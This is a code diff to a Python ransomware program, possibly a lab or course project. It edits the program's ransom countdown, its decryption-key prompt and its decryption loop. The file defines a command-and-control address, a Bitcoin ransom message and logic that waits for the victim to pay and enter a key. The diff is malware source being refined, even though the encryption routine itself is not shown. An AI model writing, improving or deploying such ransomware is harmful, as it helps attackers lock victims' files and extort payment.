@@ -6,7 +6,7 @@ from pathlib import Path
 from secret_manager import SecretManager
 import signal
 import os
-import threading,time
+import multiprocessing,time
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
@@ -122,13 +122,13 @@ class Ransomware:
             print(ENCRYPT_MESSAGE.format(token=self.hex_token, price=price, address=self.BITCOIN_ADDRESS))
             
             # Afficher le message pour entrer la clé de déchiffrement
-            print("\nEnter the decryption key:", end=" ")
+            print("\nEnter the decryption key: ", end=" ")
             sys.stdout.flush()
 
-            time.sleep(2)
+            time.sleep(60)
 
             # Remonter d'une ligne pour réécrire le temps restant à la prochaine itération
-            sys.stdout.write("\033[5A")
+            sys.stdout.write("\033[6A")
             sys.stdout.flush()
 
     def decrypt(self):
@@ -142,9 +142,9 @@ class Ransomware:
 
         encrypted_files = self.get_files("*.txt")
 
-
-        thread_countdown = threading.Thread(target=self.countdown)
-        thread_countdown.start()
+        # Start the countdown thread
+        process_countdown = multiprocessing.Process(target=self.countdown)
+        process_countdown.start()
 
         while True:
             try:
@@ -163,6 +163,9 @@ class Ransomware:
                 # Display a message to inform the user that everything went well
                 print(decrypt_message)
 
+                # Stop the countdown process
+                process_countdown.terminate()
+                
                 # Exit the ransomware
                 break
             except ValueError as e:
@@ -174,7 +177,6 @@ class Ransomware:
                 sys.stdout.flush()
                 #reprint the message
                 print("\rEnter the decryption key:", end="")
-                pass
             except Exception as e:
                 print(f"\nUnexpected error occurred during decryption")
                 break
